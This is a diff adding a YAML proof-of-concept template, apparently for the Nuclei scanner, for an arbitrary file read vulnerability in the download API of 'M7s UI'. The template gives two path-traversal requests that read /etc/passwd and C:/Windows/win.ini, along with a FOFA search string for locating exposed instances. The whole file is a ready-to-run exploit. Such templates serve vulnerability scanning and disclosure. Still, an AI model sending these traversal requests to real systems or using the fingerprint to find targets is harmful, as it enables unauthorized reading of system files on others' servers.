@@ -1,0 +1,26 @@
+id: poc-kzqdo3l3yxdrz40n
+info:
+  name: M7s UI download存在任意文件读取漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/kzqdo3l3yxdrz40n'
+  tags: lfi,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: kzqdo3l3yxdrz40n
+    fofa: body="static/js/chunk-libs.9540f991.js"
+http:
+- raw:
+  - GET /api/logrotate/download?file=../../../../../../../../../../../etc/passwd HTTP/1.1
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - GET /api/logrotate/download?file=../C://Windows/win.ini HTTP/1.1
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
